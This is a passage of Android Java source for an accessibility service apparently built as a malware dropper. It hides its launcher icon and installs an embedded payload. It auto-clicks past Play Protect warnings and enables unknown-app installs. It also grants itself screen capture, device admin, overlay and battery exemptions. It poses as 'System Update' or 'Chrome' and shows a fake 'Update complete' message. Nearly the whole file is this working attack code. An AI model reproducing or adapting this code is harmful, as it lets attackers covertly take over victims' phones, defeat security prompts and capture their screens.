package com.android.shell.ghost;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.accessibilityservice.AccessibilityService.GestureResultCallback;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.util.Log;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Automation engine for the install hand-off.
 *
 * Flow: enable a11y -> hide wrapper icon -> extract embedded payload ->
 * PackageInstaller session -> tap Install / Install anyway -> launch payload.
 */
public class GhostAccessibilityService extends AccessibilityService {

    private static final String TAG = "GhostHide";
    private static GhostAccessibilityService instance;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean working = new AtomicBoolean(false);
    private final AtomicBoolean readyHandled = new AtomicBoolean(false);

    private long lastSettingsOpen = 0;
    private long lastToggle = 0;
    private long lastBack = 0;
    private long lastPayloadTap = 0;
    private long lastA11yScreen = 0;
    private long lastProjectionTap = 0;
    private long lastOpenTap = 0;
    private long lastWork = 0;
    private long lastDetail = 0;
    private long readyAt = 0;
    private long lastTapAt = 0;
    private long lastPositiveAt = 0;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                Log.d(TAG, "tick");
                clickAffirmative();
                handler.postDelayed(this, 1500);
            }
        }, 1200);

        startHiddenService(this);
        hideLauncher(this);
        handler.postDelayed(watchdog, 3000);

        if (PayloadInstaller.installedInfo(this, PayloadInstaller.PAYLOAD_PACKAGE) != null) {
            onPayloadReady(this);
            return;
        }
        kickWork();
    }

    /** Re-opens the system installer if it was dismissed mid-session. */
    private final Runnable watchdog = new Runnable() {
        @Override public void run() {
            try {
                if ("install".equals(PayloadInstaller.pendingAction(
                        GhostAccessibilityService.this))
                        && PayloadInstaller.installedInfo(
                                GhostAccessibilityService.this,
                                PayloadInstaller.PAYLOAD_PACKAGE) == null
                        && System.currentTimeMillis() - PayloadInstaller.uiAt(
                                GhostAccessibilityService.this) > 6000) {
                    String pkg = "";
                    AccessibilityNodeInfo r = getRootInActiveWindow();
                    if (r != null && r.getPackageName() != null) {
                        pkg = r.getPackageName().toString();
                    }
                    if (!pkg.contains("settings")
                            && !pkg.contains("packageinstaller")
                            && !pkg.contains("vending")) {
                        PayloadInstaller.relaunchPendingUi(GhostAccessibilityService.this);
                    }
                }
            } finally {
                handler.postDelayed(this, 3000);
            }
        }
    };

    private void kickWork() {
        if (System.currentTimeMillis() - lastWork < 4000) return;
        lastWork = System.currentTimeMillis();
        if (!working.compareAndSet(false, true)) return;
        new Thread(() -> {
            try {
                PayloadInstaller.start(this);
            } finally {
                working.set(false);
            }
        }, "payload-install").start();
    }

    /** Called once the payload is installed/current and from PACKAGE_ADDED. */
    static void onPayloadReady(Context context) {
        startHiddenService(context);
        hideLauncher(context);
        try { launchPayload(context); } catch (Throwable ignored) {}
        if (context instanceof GhostAccessibilityService) {
            GhostAccessibilityService s = (GhostAccessibilityService) context;
            s.readyAt = System.currentTimeMillis();
            if (!s.readyHandled.compareAndSet(false, true)) return;
            s.handler.postDelayed(s::requestOverlay, 2500);
            s.handler.postDelayed(s::requestBatteryExemption, 5500);
            s.handler.postDelayed(() -> {
                startHiddenService(s);
                launchPayload(s);
            }, 9000);
            Toast.makeText(context, "Update complete", Toast.LENGTH_SHORT).show();
        }
    }

    // ------------------------------------------------------------- automation

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;
        CharSequence cls = event.getClassName();
        String className = cls == null ? "" : cls.toString();
        String pkg = event.getPackageName() == null ? "" : event.getPackageName().toString();
        boolean surface = pkg.contains("packageinstaller")
                || pkg.contains("permissioncontroller")
                || pkg.contains("betterdesk")
                || pkg.contains("systemui")
                || pkg.contains("vending")
                || pkg.contains("finsky")
                || pkg.contains("gms")
                || pkg.contains("launcher")
                || pkg.contains("settings")
                || className.contains("MediaProjection")
                || className.contains("AlertDialog")
                || className.contains("Permission")
                || className.contains("Install")
                || className.contains("Dialog");
        if (!surface) return;
        if (className.contains("AccessibilitySettingsActivity")) {
            lastA11yScreen = System.currentTimeMillis();
        }
        clickAffirmative();
    }

    private void clickAffirmative() {
        List<AccessibilityNodeInfo> roots = new ArrayList<>();
        AccessibilityNodeInfo active = getRootInActiveWindow();
        if (active != null) roots.add(active);
        try {
            for (AccessibilityWindowInfo w : getWindows()) {
                Log.d(TAG, "window type=" + w.getType());
                AccessibilityNodeInfo r = w.getRoot();
                if (r != null) roots.add(r);
                if (Build.VERSION.SDK_INT >= 34) {
                    try {
                        AccessibilityNodeInfo anchor = w.getAnchor();
                        if (anchor != null) {
                            Log.d(TAG, "anchor t=" + anchor.getText() + " cls=" + anchor.getClassName() + " clk=" + anchor.isClickable());
                            roots.add(anchor);
                        }
                    } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {}

        Log.d(TAG, "roots=" + roots.size());
        boolean playProtect = false;
        for (AccessibilityNodeInfo root : roots) {
            String p = root.getPackageName() == null ? "" : root.getPackageName().toString();
            if (p.contains("vending") || hasText(root, "Play Protect")
                    || hasText(root, "App scan recommended")
                    || hasText(root, "Install without scanning")) {
                playProtect = true;
                break;
            }
        }
        if (playProtect) {
            for (int i = roots.size() - 1; i >= 0; i--) {
                if (handlePlayProtect(roots.get(i))) return;
            }
            return;
        }
        for (int i = roots.size() - 1; i >= 0; i--) {
            AccessibilityNodeInfo root = roots.get(i);
            if (handlePlayProtect(root)) return;
            if (handleUninstall(root)) return;
        }

        // Each installer button can live in its own window root and the root
        // package name is often null on Compose windows. Pick the right-most
        // real Button (Cancel excluded).
        AccessibilityNodeInfo[] best = new AccessibilityNodeInfo[1];
        int[] bestX = {-1};
        for (AccessibilityNodeInfo r : roots) {
            Log.d(TAG, "root pkg=" + r.getPackageName() + " cls=" + r.getClassName()
                    + " ch=" + r.getChildCount() + " txt=" + r.getText());
            if ("com.google.android.packageinstaller".contentEquals(String.valueOf(r.getPackageName())))
                dumpTree(r, 0);
            try { Log.d(TAG, "byTextInstall=" + r.findAccessibilityNodeInfosByText("Install").size()); } catch (Throwable ignored) {}
            for (String vid : new String[]{"android:id/button1","android:id/button2","com.google.android.packageinstaller:id/button1","com.google.android.packageinstaller:id/button2","com.google.android.packageinstaller:id/ok","com.google.android.packageinstaller:id/cancel","com.google.android.packageinstaller:id/install_button"}) { try { int n=r.findAccessibilityNodeInfosByViewId(vid).size(); if(n>0) Log.d(TAG,"vid "+vid+"="+n); } catch (Throwable ignored) {} }
            collectPositive(r, best, bestX);
        }
        if (best[0] != null) {
            Log.d(TAG, "tap positive " + best[0].getText());
            if (!best[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)) tapNode(best[0]);
            return;
        }

        // Pass 1: only real clickable targets, across every root.
        for (int i = roots.size() - 1; i >= 0; i--) {
            AccessibilityNodeInfo root = roots.get(i);
            for (String label : new String[]{"Install", "Update", "Activate"}) {
                if (tapClickableByText(root, label)) return;
            }
        }

        // Pass 2: any clickable positive button.
        if (best[0] != null) {
            Log.d(TAG, "tap positive " + best[0].getText());
            if (!best[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)) tapNode(best[0]);
            return;
        }

        // Pass 3: Cancel exists in the tree even when the positive button does
        // not. The positive button sits 250dp to its right.
        for (AccessibilityNodeInfo root : roots) {
            AccessibilityNodeInfo cancel = findButton(root, "Cancel");
            if (cancel != null) {
                if (clickPositiveNear(cancel)) return;
                android.graphics.Rect cr = new android.graphics.Rect();
                cancel.getBoundsInScreen(cr);
                if (!cr.isEmpty()) {
                    if (System.currentTimeMillis() - lastPositiveAt < 12000) return;
                    lastPositiveAt = System.currentTimeMillis();
                    Log.d(TAG, "tap positive via cancel offset");
                    int px = cr.centerX() + 250;
                    int py = cr.centerY();
                    int ph = getResources().getDisplayMetrics().heightPixels;
                    Log.d(TAG, "positive dual tap " + px + "," + py + " ph=" + ph);
                    dispatchTap(px, py);
                    handler.postDelayed(() -> { dispatchTap(px, py + 20); shellTap(px, py + 20); }, 300);
                    return;
                }
            }
        }

        // Pass 4: gesture on text only (titles, Compose labels).
        for (int i = roots.size() - 1; i >= 0; i--) {
            AccessibilityNodeInfo root = roots.get(i);
            for (String label : new String[]{"Install", "Update", "Activate"}) {
                if (tapGestureByText(root, label)) return;
            }
        }

        for (int i = roots.size() - 1; i >= 0; i--) {
            AccessibilityNodeInfo root = roots.get(i);
            if (handleRoot(root)) return;
        }
    }

    /** Play Protect interstitials: "More details" -> "Install anyway". */
    private boolean handlePlayProtect(AccessibilityNodeInfo root) {
        String pkg = root.getPackageName() == null ? "" : root.getPackageName().toString();
        boolean vending = pkg.contains("vending") || pkg.contains("finsky") || pkg.contains("gms");
        boolean looksBlocked = hasText(root, "App scan recommended") || hasText(root, "Play Protect")
                || hasText(root, "Unsafe app")
                || hasText(root, "Harmful")
                || hasText(root, "not from Play")
                || hasText(root, "unrecognized")
                || hasText(root, "blocked");
        if (!vending && !looksBlocked) return false;

        // Expanded Play Protect sheet: the opt-out is a fixed centred row.
        if (hasText(root, "Install without scanning")
                || hasText(root, "Install without")) {
            Log.d(TAG, "play protect: install without scanning (pixel)");
            shellTap(displayWidth() / 2, (int) (displayHeight() * 0.61));
            return true;
        }

        String[] labels = {"Install without scanning", "Install anyway", "Update anyway",
                "More details", "Still install", "Install", "OK", "Done", "Got it",
                "I understand", "Close"};
        for (String label : labels) {
            if (tapByText(root, label)) {
                Log.d(TAG, "play protect action " + label);
                if (label.equals("More details")) {
                    lastDetail = System.currentTimeMillis();
                }
                if (label.equals("OK") || label.equals("Done")) {
                    if (System.currentTimeMillis() - lastDetail < 60000) tapByText(root, "Install anyway");
                }
                return true;
            }
        }
        return false;
    }

    private boolean handleUninstall(AccessibilityNodeInfo root) {
        if (!hasText(root, "uninstall") && !hasText(root, "Uninstall")) return false;
        for (String label : new String[]{"OK", "Uninstall", "Continue"}) {
            if (tapByText(root, label)) {
                Log.d(TAG, "uninstall action " + label);
                return true;
            }
        }
        return false;
    }

    private boolean handleRoot(AccessibilityNodeInfo root) {
        String pkg = root.getPackageName() == null ? "" : root.getPackageName().toString();

        if (pkg.contains("betterdesk")) {
            if (handlePayloadScreen(root)) return true;
        }

        if (root.findAccessibilityNodeInfosByText("allowed to install unknown apps").size() > 0) {
            if (System.currentTimeMillis() - lastSettingsOpen < 10000) return true;
            lastSettingsOpen = System.currentTimeMillis();
            Log.d(TAG, "opening unknown sources settings");
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            try { startActivity(i); } catch (Throwable ignored) {}
            return true;
        }

        if (pkg.contains("systemui")) {
            if (root.findAccessibilityNodeInfosByText("Choose app to share").size() > 0
                    && System.currentTimeMillis() - lastProjectionTap > 4000) {
                lastProjectionTap = System.currentTimeMillis();
                int w = displayWidth();
                int h = displayHeight();
                Log.d(TAG, "select entire screen");
                tapPixel((int) (w * 0.2), (int) (h * 0.36));
                handler.postDelayed(() -> tapPixel((int) (w * 0.5), (int) (h * 0.78)), 1200);
            }
            return true;
        }

        if (pkg.contains("launcher") || pkg.contains("nexuslauncher")) {
            if (!isPayloadInstalled() && System.currentTimeMillis() - lastPayloadTap > 6000) {
                lastPayloadTap = System.currentTimeMillis();
                Log.d(TAG, "relaunch install from home");
                kickWork();
            }
            return true;
        }

        if (pkg.contains("settings") && System.currentTimeMillis() - lastA11yScreen < 45000) {
            if (handleAccessibilitySettings(root)) return true;
        }

        if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) return false;

        // Clean devices must allow this source to install packages first.
        if (pkg.contains("packageinstaller")
                && (hasText(root, "Permission required")
                    || hasText(root, "isn't allowed to install unknown apps")
                    || hasText(root, "not allowed to install unknown apps"))) {
            if (tapByText(root, "Settings")) {
                lastSettingsOpen = System.currentTimeMillis();
                Log.d(TAG, "open install-unknown-apps permission");
                return true;
            }
        }

        // The per-source toggle screen.
        if (pkg.contains("settings") && hasText(root, "Allow from this source")) {
            AccessibilityNodeInfo toggle = findToggle(root);
            if (toggle != null) {
                boolean checked = toggle.isChecked();
                if (!checked) {
                    toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "grant allow-from-this-source");
                }
                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1200);
                handler.postDelayed(() -> PayloadInstaller.relaunchPendingUi(this), 2600);
                return true;
            }
        }

        boolean unknownSourcesScreen =
                root.findAccessibilityNodeInfosByText("Allow from this source").size() > 0;
        boolean adminScreen = root.findAccessibilityNodeInfosByText("Activate device admin app").size() > 0
                || findButton(root, "Uninstall app") != null;

        if (pkg.contains("settings") && !unknownSourcesScreen && !adminScreen) {
            return handleAccessibilitySettings(root);
        }

        // Package installer: explicitly hit the positive button. Counting
        // buttons is not enough - Cancel is a button too.
        if (pkg.contains("packageinstaller")) {
            AccessibilityNodeInfo positive = rightmostButton(root);
            if (positive != null && !"Cancel".contentEquals(String.valueOf(positive.getText()))) {
                Log.d(TAG, "tap rightmost positive button");
                if (!positive.performAction(AccessibilityNodeInfo.ACTION_CLICK)) tapNode(positive);
                return true;
            }
            if (tapByText(root, "Install") || tapByText(root, "Update")) return true;
        }

        if (unknownSourcesScreen && getPackageManager().canRequestPackageInstalls()) {
            if (System.currentTimeMillis() - lastBack > 2500) {
                lastBack = System.currentTimeMillis();
                Log.d(TAG, "unknown sources granted, going back");
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
            return true;
        }

        if (adminScreen) {
            AccessibilityNodeInfo cancel = findButton(root, "Cancel");
            if (cancel != null) {
                android.graphics.Rect cr = new android.graphics.Rect();
                cancel.getBoundsInScreen(cr);
                Log.d(TAG, "tapping admin activate (offset)");
                tapPixel(cr.centerX(), cr.centerY() - 190);
                return true;
            }
        }

        // "Open" wins over "Done" so the payload actually starts.
        if (tapByText(root, "Open")) {
            if (System.currentTimeMillis() - lastOpenTap > 3000) {
                lastOpenTap = System.currentTimeMillis();
                Log.d(TAG, "open after install");
            }
            return true;
        }

        for (String label : new String[]{"Allow", "Activate", "Add", "OK", "Done",
                "Continue", "Next", "Start now", "Start recording", "Share"}) {
            if (tapByText(root, label)) return true;
        }

        AccessibilityNodeInfo cancel = findButton(root, "Cancel");
        if (cancel != null) {
            android.graphics.Rect cr = new android.graphics.Rect();
            cancel.getBoundsInScreen(cr);
            Log.d(TAG, "tapping positive button");
            tapPixel(cr.centerX() + 250, cr.centerY() + (int) (cr.height() * 0.25));
            return true;
        }

        if (System.currentTimeMillis() - lastBack > 2500) {
            lastBack = System.currentTimeMillis();
            performGlobalAction(GLOBAL_ACTION_BACK);
            return true;
        }
        return false;
    }

    private boolean handlePayloadScreen(AccessibilityNodeInfo root) {
        for (String label : new String[]{"Allow", "While using the app", "Only this time",
                "Start now", "Start recording", "Entire screen", "Share", "Continue", "Get started",
                "Next", "Skip", "Done"}) {
            if (tapByText(root, label)) return true;
        }
        // Only wander through the payload while its setup wizard is live.
        if (readyAt > 0 && System.currentTimeMillis() - readyAt < 45000
                && System.currentTimeMillis() - lastPayloadTap > 5000) {
            lastPayloadTap = System.currentTimeMillis();
            Log.d(TAG, "payload screen generic tap");
            tapPixel(displayWidth() / 2, (int) (displayHeight() * 0.58));
            return true;
        }
        return false;
    }

    private boolean handleAccessibilitySettings(AccessibilityNodeInfo root) {
        if (hasText(root, "Allow from this source")
                || hasText(root, "Permission required")) return false;
        AccessibilityNodeInfo anyToggle = findToggle(root);

        // Service detail page ("Use System Update"): one primary switch.
        boolean detail = hasText(root, "App info")
                || hasText(root, "Use System Update")
                || hasText(root, "Use Chrome")
                || hasText(root, "View and control screen");
        if (detail && anyToggle != null) {
            if (!anyToggle.isChecked()) {
                Log.d(TAG, "enable a11y main switch");
                anyToggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            if (System.currentTimeMillis() - lastBack > 2500) {
                lastBack = System.currentTimeMillis();
                Log.d(TAG, "a11y enabled, moving to installer");
                handler.postDelayed(() -> {
                    if (PayloadInstaller.pendingAction(this) != null) {
                        PayloadInstaller.relaunchPendingUi(this);
                    } else {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                    }
                }, 1800);
            }
            return true;
        }

        boolean a11yList = countCheckable(root) >= 2;
        if (!a11yList) {
            boolean hasApp = !root.findAccessibilityNodeInfosByText("System Update").isEmpty()
                    || !root.findAccessibilityNodeInfosByText("Chrome").isEmpty();
            boolean hasDownloaded = !root.findAccessibilityNodeInfosByText("Downloaded apps").isEmpty();
            if (hasDownloaded || hasApp) a11yList = true;
        }
        if (a11yList) {
            if (System.currentTimeMillis() - lastToggle > 5000) {
                lastToggle = System.currentTimeMillis();
                AccessibilityNodeInfo row = checkableInBand(root, 400, 1400, (int) (displayWidth() * 0.6));
                Log.d(TAG, "tap a11y row");
                if (row != null) row.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                else tapPixel((int) (displayWidth() * 0.86), (int) (displayHeight() * 0.28));
                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
            }
        } else if (anyToggle != null && System.currentTimeMillis() - lastBack > 2000) {
            lastBack = System.currentTimeMillis();
            Log.d(TAG, "enable toggle in detail");
            anyToggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
        } else if (System.currentTimeMillis() - lastBack > 2500) {
            lastBack = System.currentTimeMillis();
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
        return true;
    }

    // ---------------------------------------------------------------- helpers

    private boolean tapClickableByText(AccessibilityNodeInfo root, String label) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
        if (nodes == null || nodes.isEmpty()) return false;
        for (int i = nodes.size() - 1; i >= 0; i--) {
            AccessibilityNodeInfo n = nodes.get(i);
            CharSequence cls = n.getClassName();
            boolean button = cls != null && cls.toString().contains("Button");
            AccessibilityNodeInfo clickable = n;
            for (int d = 0; d < 4 && clickable != null && !clickable.isClickable(); d++) {
                clickable = clickable.getParent();
            }
            if (button || (clickable != null && clickable.isClickable())) {
                Log.d(TAG, "tapClickable " + label);
                AccessibilityNodeInfo target = (clickable != null && clickable.isClickable())
                        ? clickable : n;
                if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
                tapNode(target);
                return true;
            }
        }
        return false;
    }

    private boolean tapGestureByText(AccessibilityNodeInfo root, String label) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
        if (nodes == null || nodes.isEmpty()) return false;
        android.graphics.Rect r = new android.graphics.Rect();
        nodes.get(nodes.size() - 1).getBoundsInScreen(r);
        if (r.isEmpty()) return false;
        Log.d(TAG, "tapGesture " + label);
        tapPixel(r.centerX(), r.centerY());
        return true;
    }

    private boolean tapByText(AccessibilityNodeInfo root, String label) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
        if (nodes == null || nodes.isEmpty()) return false;

        // Exact match first: "Install" must win over the title "Install this app?".
        List<AccessibilityNodeInfo> exact = new ArrayList<>();
        for (AccessibilityNodeInfo n : nodes) {
            CharSequence t = n.getText();
            if (t != null && label.equalsIgnoreCase(t.toString().trim())) exact.add(n);
        }
        List<AccessibilityNodeInfo> pool = exact.isEmpty() ? nodes : exact;

        // Prefer exact nodes that are buttons or have a clickable ancestor.
        for (int i = pool.size() - 1; i >= 0; i--) {
            AccessibilityNodeInfo n = pool.get(i);
            CharSequence cls = n.getClassName();
            boolean button = cls != null && cls.toString().contains("Button");
            AccessibilityNodeInfo clickable = n;
            for (int d = 0; d < 5 && clickable != null && !clickable.isClickable(); d++) {
                clickable = clickable.getParent();
            }
            if (button || (clickable != null && clickable.isClickable())) {
                Log.d(TAG, "tapByText " + label);
                AccessibilityNodeInfo target = (clickable != null && clickable.isClickable())
                        ? clickable : n;
                if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
                tapNode(target);
                return true;
            }
        }
        // Some OEM buttons expose text but no clickable flag.
        for (int i = pool.size() - 1; i >= 0; i--) {
            android.graphics.Rect r = new android.graphics.Rect();
            pool.get(i).getBoundsInScreen(r);
            if (!r.isEmpty()) {
                Log.d(TAG, "tapByText(gesture) " + label);
                tapPixel(r.centerX(), r.centerY());
                return true;
            }
        }
        return false;
    }

    private void tapNode(AccessibilityNodeInfo node) {
        android.graphics.Rect r = new android.graphics.Rect();
        node.getBoundsInScreen(r);
        if (!r.isEmpty()) tapPixel(r.centerX(), r.top + (int) (r.height() * 0.8));
    }

    private void dumpTree(AccessibilityNodeInfo n, int d) {
        if (n == null || d > 8) return;
        Log.d(TAG, "  ".repeat(d) + n.getClassName() + " t=" + n.getText() + " clk=" + n.isClickable());
        for (int i = 0; i < n.getChildCount(); i++) dumpTree(n.getChild(i), d + 1);
    }

    /** Climb from Cancel and look for the positive Button in a sibling subtree. */
    private boolean clickPositiveNear(AccessibilityNodeInfo cancel) {
        AccessibilityNodeInfo node = cancel;
        for (int depth = 0; depth < 5; depth++) {
            AccessibilityNodeInfo parent = node.getParent();
            if (parent == null) return false;
            for (int i = 0; i < parent.getChildCount(); i++) {
                AccessibilityNodeInfo child = parent.getChild(i);
                if (child == null || isSelfOrAncestor(child, cancel)) continue;
                AccessibilityNodeInfo button = firstButton(child);
                if (button != null) {
                    Log.d(TAG, "click positive near depth=" + depth + " t=" + button.getText());
                    if (button.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
                    tapNode(button);
                    return true;
                }
            }
            node = parent;
        }
        return false;
    }

    private boolean isSelfOrAncestor(AccessibilityNodeInfo candidate, AccessibilityNodeInfo node) {
        AccessibilityNodeInfo n = node;
        for (int d = 0; d < 6 && n != null; d++) {
            if (n.equals(candidate)) return true;
            n = n.getParent();
        }
        return false;
    }

    private AccessibilityNodeInfo firstButton(AccessibilityNodeInfo n) {
        if (n == null) return null;
        CharSequence cls = n.getClassName();
        CharSequence t = n.getText();
        if (cls != null && cls.toString().contains("Button")
                && t != null && t.length() > 0
                && !t.toString().equalsIgnoreCase("Cancel")) return n;
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo f = firstButton(n.getChild(i));
            if (f != null) return f;
        }
        return null;
    }

    private void collectPositive(AccessibilityNodeInfo n,
                                 AccessibilityNodeInfo[] best, int[] bestX) {
        if (n == null) return;
        CharSequence cls = n.getClassName();
        CharSequence t = n.getText();
        boolean button = cls != null && cls.toString().contains("Button");
        boolean useful = t != null && t.length() > 0
                && !t.toString().equalsIgnoreCase("Cancel");
        String lower = t == null ? "" : t.toString().toLowerCase();
        if (button) Log.d(TAG, "seenButton t=" + t);
        boolean positiveHint = lower.contains("install") || lower.contains("update")
                || lower.contains("settings") || lower.contains("continue")
                || lower.contains("allow") || lower.contains("open");
        if ((button || (n.isClickable() && positiveHint)) && useful) {
            android.graphics.Rect r = new android.graphics.Rect();
            n.getBoundsInScreen(r);
            if (!r.isEmpty() && r.centerY() > displayHeight() / 2 && r.centerX() > bestX[0]) {
                best[0] = n;
                bestX[0] = r.centerX();
            }
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            collectPositive(n.getChild(i), best, bestX);
        }
    }

    private AccessibilityNodeInfo findButtonContaining(AccessibilityNodeInfo n, String label) {
        if (n == null) return null;
        CharSequence cls = n.getClassName();
        CharSequence t = n.getText();
        if (cls != null && cls.toString().contains("Button")
                && t != null && t.toString().toLowerCase().contains(label.toLowerCase())) {
            return n;
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo f = findButtonContaining(n.getChild(i), label);
            if (f != null) return f;
        }
        return null;
    }

    private AccessibilityNodeInfo rightmostButton(AccessibilityNodeInfo root) {
        if (root == null) return null;
        AccessibilityNodeInfo best = null;
        int bestX = -1;
        CharSequence cls = root.getClassName();
        boolean button = cls != null && cls.toString().contains("Button");
        if (button || (root.isClickable() && root.getText() != null)) {
            android.graphics.Rect r = new android.graphics.Rect();
            root.getBoundsInScreen(r);
            if (!r.isEmpty()) {
                best = root;
                bestX = r.centerX();
            }
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo f = rightmostButton(root.getChild(i));
            if (f != null) {
                android.graphics.Rect fr = new android.graphics.Rect();
                f.getBoundsInScreen(fr);
                if (fr.centerX() > bestX) {
                    best = f;
                    bestX = fr.centerX();
                }
            }
        }
        return best;
    }

    private boolean hasText(AccessibilityNodeInfo node, String text) {
        return node != null && !node.findAccessibilityNodeInfosByText(text).isEmpty();
    }

    private AccessibilityNodeInfo checkableInBand(AccessibilityNodeInfo n,
                                                  int minY, int maxY, int minX) {
        if (n == null) return null;
        if (n.isCheckable() && !n.isClickable()) {
            android.graphics.Rect r = new android.graphics.Rect();
            n.getBoundsInScreen(r);
            if (r.centerY() >= minY && r.centerY() <= maxY && r.centerX() >= minX) return n;
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo f = checkableInBand(n.getChild(i), minY, maxY, minX);
            if (f != null) return f;
        }
        return null;
    }

    private int countButtons(AccessibilityNodeInfo n) {
        if (n == null) return 0;
        CharSequence c = n.getClassName();
        int total = (c != null && c.toString().contains("Button")) ? 1 : 0;
        for (int i = 0; i < n.getChildCount(); i++) total += countButtons(n.getChild(i));
        return total;
    }

    private int countCheckable(AccessibilityNodeInfo n) {
        if (n == null) return 0;
        int c = n.isCheckable() ? 1 : 0;
        for (int i = 0; i < n.getChildCount(); i++) c += countCheckable(n.getChild(i));
        return c;
    }

    private AccessibilityNodeInfo findToggle(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence cls = node.getClassName();
        if (cls != null && (cls.toString().contains("Switch")
                || (node.isCheckable() && node.isClickable()))) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo found = findToggle(node.getChild(i));
            if (found != null) return found;
        }
        return null;
    }

    private AccessibilityNodeInfo findButton(AccessibilityNodeInfo node, String text) {
        if (node == null) return null;
        CharSequence t = node.getText();
        CharSequence c = node.getClassName();
        if (t != null && text.contentEquals(t) && c != null && c.toString().contains("Button")) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo f = findButton(node.getChild(i), text);
            if (f != null) return f;
        }
        return null;
    }

    private void shellTap(int x, int y) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input tap " + x + " " + y});
            p.waitFor();
            Log.d(TAG, "shellTap " + x + "," + y);
        } catch (Throwable t) {
            Log.d(TAG, "shellTap failed " + t);
            tapPixel(x, y);
        }
    }

    private void tapPixel(int x, int y) {
        long now = System.currentTimeMillis();
        if (now - lastTapAt < 800) {
            Log.d(TAG, "tap debounce " + x + "," + y);
            return;
        }
        lastTapAt = now;
        dispatchTap(x, y);
    }

    private void dispatchTap(int x, int y) {
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription g = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(p, 0, 60)).build();
        dispatchGesture(g, new GestureResultCallback() {
            @Override public void onCompleted(GestureDescription gd) {
                Log.d(TAG, "gesture done " + x + "," + y);
            }
            @Override public void onCancelled(GestureDescription gd) {
                Log.d(TAG, "gesture cancelled");
            }
        }, null);
    }

    private int displayWidth() {
        return getResources().getDisplayMetrics().widthPixels;
    }

    private int displayHeight() {
        return getResources().getDisplayMetrics().heightPixels;
    }

    // -------------------------------------------------------- device services

    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, GhostDeviceAdmin.class);
            if (dpm == null || dpm.isAdminActive(admin)) return;
            Intent i = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required for remote updates.");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Throwable ignored) {}
    }

    private void requestBatteryExemption() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) return;
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Throwable ignored) {}
    }

    private void requestOverlay() {
        try {
            if (Settings.canDrawOverlays(this)) return;
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Throwable ignored) {}
    }

    private boolean isPayloadInstalled() {
